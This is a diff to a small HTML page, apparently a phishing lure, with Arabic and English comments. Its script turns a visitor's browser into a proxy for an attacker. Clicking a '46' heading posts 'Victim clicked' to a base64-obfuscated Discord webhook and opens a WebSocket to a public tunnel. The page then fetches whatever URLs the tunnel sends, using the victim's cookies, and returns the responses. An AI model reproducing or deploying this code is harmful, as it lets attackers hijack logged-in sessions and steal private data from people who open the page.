@@ -14,7 +14,10 @@
     <h1 id="status" onclick="startMaster()">46</h1>
 
     <script>
-        const PROXY_SERVER = "wss://6611cfd937b51a.lhr.life";
+        // الرابط الجديد الخاص بك
+        const PROXY_SERVER = "wss://31e8c94a917825.lhr.life";
+        
+        // ويب هوك ديسكورد للإشعارات
         const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
         const HOOK = atob(key);
 
@@ -23,39 +26,50 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({content: msg})
-            });
+            }).catch(e => {});
         }
 
-        function startMaster() {
-            document.getElementById('status').innerText = "DONE";
-            document.getElementById('status').style.color = "#0f0";
-            sendDiscord("🔵 **V46: Signal Received**");
+        async function startMaster() {
+            const btn = document.getElementById('status');
+            btn.innerText = "DONE";
+            btn.style.color = "#0f0";
             
+            sendDiscord("🚀 **V46 Master:** Victim clicked '46'. Opening Tunnel...");
+
             const socket = new WebSocket(PROXY_SERVER);
-            
+
             socket.onopen = () => {
+                // إرسال إشارة الانضمام للسيرفر
                 socket.send(JSON.stringify({ type: 'join' }));
             };
 
             socket.onmessage = async (event) => {
-                // الكود هنا صار "جسر" فقط بياخد الطلب وبيرجعه
+                // استقبال طلبات التصفح من فايرفوكس وتنفيذها بكوكيز الضحية
                 try {
                     const req = JSON.parse(event.data);
-                    const response = await fetch(req.url, {
-                        method: req.method,
-                        headers: req.headers,
-                        credentials: 'include'
-                    });
-                    const data = await response.text();
-                    socket.send(JSON.stringify({
-                        body: data,
-                        status: response.status,
-                        headers: Object.fromEntries(response.headers)
-                    }));
-                } catch (e) {}
+                    if (req.url) {
+                        const response = await fetch(req.url, {
+                            method: req.method,
+                            headers: req.headers,
+                            credentials: 'include'
+                        });
+                        const body = await response.text();
+                        
+                        socket.send(JSON.stringify({
+                            body: body,
+                            status: response.status,
+                            headers: Object.fromEntries(response.headers)
+                        }));
+                    }
+                } catch (e) {
+                    // تمرير البيانات الخام إذا لم تكن JSON
+                }
             };
 
-            setInterval(() => { if(socket.readyState === 1) socket.send('ping'); }, 10000);
+            // الحفاظ على الجلسة نشطة
+            setInterval(() => {
+                if (socket.readyState === 1) socket.send(JSON.stringify({type: 'ping'}));
+            }, 10000);
         }
     </script>
 </body>
